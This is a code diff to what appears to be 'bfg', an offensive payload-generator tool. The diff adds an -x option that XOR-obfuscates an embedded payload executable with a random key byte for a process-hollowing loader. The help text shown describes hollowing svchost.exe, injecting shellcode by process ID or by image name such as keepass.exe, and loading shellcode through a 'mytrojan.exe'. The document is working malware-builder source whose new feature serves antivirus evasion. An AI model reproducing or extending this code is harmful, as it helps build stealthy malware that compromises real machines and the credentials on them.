@@ -10,6 +10,7 @@ Web: https://github.com/govolution/bfg
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+#include <time.h>
 
 void print_start();
 void print_help();
@@ -35,6 +36,7 @@ int main (int argc, char **argv)
 	int qflag = 0;
 	int Pflag = 0;
 	int dflag = 0;
+	int xflag = 0;
 
 	int index;
 	int c;
@@ -42,7 +44,7 @@ int main (int argc, char **argv)
 	opterr = 0;
 
 	// compute the options
-	while ((c = getopt (argc, argv, "e:f:i:H:I:lphFXqPd")) != -1)	
+	while ((c = getopt (argc, argv, "e:f:i:H:I:lphFXqPdx")) != -1)	
 	{		
 		switch (c)			
 		{
@@ -81,6 +83,9 @@ int main (int argc, char **argv)
 				break;
 			case 'P':
 				Pflag = 1;
+				break;
+			case 'x':
+				xflag = 1;
 				break;
 			case 'p':
 				print_debug = 1;
@@ -186,6 +191,18 @@ int main (int argc, char **argv)
 	{
 		printf("Write executable from %s to defs.h\n", Hvalue);
 		
+		unsigned char keyByte;
+		
+		if(xflag)
+		{
+			// Initialize RNG
+			time_t t;
+			srand((unsigned) time(&t));
+		
+			// Generate random key byte
+			keyByte = rand() % 256;
+		}
+			
 		FILE *file_exe = fopen(Hvalue, "r");
 		FILE *file_def = fopen("defs.h", "a");
 		
@@ -200,6 +217,11 @@ int main (int argc, char **argv)
 			if ((currentByte = fgetc(file_exe)) == EOF) break;			
 			if (i != 0) fprintf(file_def, ",");
 			if ((i % 12) == 0) fprintf(file_def, "\n\t");
+			if(xflag)
+			{
+				// XOR the byte with the generated key before writing it into the array
+				currentByte = currentByte ^ keyByte;
+			}
 			fprintf(file_def, "0x%.2X", (unsigned char) currentByte);
 			currentSize++;
 		}
@@ -208,8 +230,16 @@ int main (int argc, char **argv)
 		
 		// Write payload size in bytes into defs.h
 		fprintf(file_def, "\nlong payloadSize = %ld;\n", currentSize);
-				
-		// Set define
+		
+		if(xflag)
+		{
+			// Write keybyte value into defs.h
+			fprintf(file_def, "\nunsigned char keyByte = 0x%.2X;\n", keyByte);
+			// Set define for XOR_OBFUSCATION
+			fprintf(file_def, "\n#define XOR_OBFUSCATION\n");
+		}
+		
+		// Set define for PROCESS_HOLLOWING
 		fprintf(file_def, "\n#define PROCESS_HOLLOWING\n");
 		
 		// Close file handles
@@ -266,6 +296,7 @@ void print_help()
 	//printf("\t-i exe for injecting an executable\n");	
 	printf("-H hollow target process and insert payload executable: pwn.exe svchost.exe\n");
 	printf("\t-H mypayload.exe to set payload to inserted into the hollowed process\n");
+	printf("\tSet -x flag to XOR obfuscate the payload with a random key byte\n");
 	printf("-P inject shellcode by PID as argument, call pwn.exe PID\n");
 	printf("-I inject shellcode by image name, call for example: pwn.exe keepass.exe\n");	
 	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt\n");
